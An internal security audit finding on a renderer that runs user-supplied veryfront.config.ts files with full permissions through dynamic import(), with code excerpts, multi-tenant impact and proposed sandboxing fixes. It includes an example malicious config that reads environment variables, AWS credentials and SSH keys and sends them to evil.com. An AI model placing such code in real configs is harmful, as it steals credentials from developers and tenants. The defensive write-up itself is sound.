# 008.2 - Unsafe Config Code Execution

## Severity: CRITICAL

## Location

**File:** `/Users/mattboon/Sites/veryfront-renderer/src/config/loader.ts`
**Lines:** 214-270 (loadConfigFromVirtualFS), 273-306 (loadAndMergeConfig)

## The Problem

User-provided `veryfront.config.ts` is transpiled and executed via dynamic `import()` with the renderer's full permissions:

```typescript
// src/config/loader.ts:257-267
const tempDir = await fs.makeTempDir({ prefix: "vf-config-" });
const tempFile = join(tempDir, "config.mjs");

try {
  await fs.writeTextFile(tempFile, js);
  // CRITICAL: User code executes with full Deno/Node permissions
  const configModule = await import(`file://${tempFile}?v=${Date.now()}`);
  const userConfig = configModule.default || configModule;
  return validateAndCacheConfig(userConfig, cacheKey);
} finally {
  await fs.remove(tempDir, { recursive: true });
}
```

For local filesystem (non-virtual):

```typescript
// src/config/loader.ts:301-303
const configUrl = `file://${configPath}?t=${Date.now()}-${crypto.randomUUID()}`;
const configModule = await import(configUrl);  // User code executes HERE
const userConfig = configModule.default || configModule;
```

## Why It's Bad

A malicious or compromised `veryfront.config.ts` can:

1. **Read arbitrary files** (secrets, credentials, other project data)
2. **Make network requests** (data exfiltration)
3. **Modify global state** (affect other projects in multi-tenant)
4. **Spawn processes** (crypto mining, botnets)
5. **Access environment variables** (API keys, tokens)

### Example Malicious Config

```typescript
// veryfront.config.ts - looks innocent but is malicious
import { readFileSync, writeFileSync } from "node:fs";
import { execSync } from "node:child_process";

// Exfiltrate environment variables
const secrets = {
  env: process.env,
  aws: readFileSync(`${process.env.HOME}/.aws/credentials`, "utf-8").catch(() => ""),
  github: readFileSync(`${process.env.HOME}/.ssh/id_rsa`, "utf-8").catch(() => ""),
};

// Send to attacker
fetch("https://evil.com/steal", {
  method: "POST",
  body: JSON.stringify(secrets),
});

// Innocent-looking export
export default {
  title: "My App",
  description: "A normal app",
};
```

This code runs with FULL renderer permissions when the config is loaded.

## Multi-Tenancy Impact

**CRITICAL for multi-tenant deployment:**

In production, a malicious user could:
1. Upload a project with a weaponized config
2. Config executes when renderer loads the project
3. Attacker gains access to:
   - All environment variables (API tokens, database credentials)
   - Ability to read files from the renderer's filesystem
   - Ability to affect other tenants sharing the same pod
   - Ability to make arbitrary network requests from the renderer's IP

## Current Mitigations (Insufficient)

The codebase has a sandbox implementation, but it's **not used for config loading**:

```typescript
// src/security/sandbox/deno-sandbox.ts:46-56
const workerCode = `self.onmessage = async (e) => {` +
  `  const { code } = e.data;` +
  `  let result;` +
  `  try { result = await (async () => {` +
  `    return await (new Function(code))();` +  // Runs with { permissions: "none" }
  `  })(); } catch (error) {` +
  ...
```

This sandbox exists but config loading uses **direct import()** instead.

## Validation Timing Problem

Schema validation happens **AFTER** code execution:

```typescript
// src/config/loader.ts:189-208
function validateAndCacheConfig(userConfig: unknown, cacheKey: string): VeryfrontConfig {
  // By this point, the malicious code has ALREADY RUN
  if (!userConfig || typeof userConfig !== "object" || Array.isArray(userConfig)) {
    throw new ConfigValidationError(...);
  }

  validateCorsConfig(userConfig);      // Too late
  validateConfigShape(userConfig);     // Too late

  const merged = mergeConfigs(userConfig as Partial<VeryfrontConfig>);
  // ...
}
```

## Solution

See **[008.0 - Userland Config RFC](./008.0-userland-config-rfc.md)** for the complete solution.

Key changes:
1. Add static analysis BEFORE transpilation to detect I/O patterns
2. Execute config in Worker sandbox with `{ permissions: "none" }`
3. Add timeout and memory limits to prevent DoS
4. Consider restricting config to JSON/YAML for production deployments
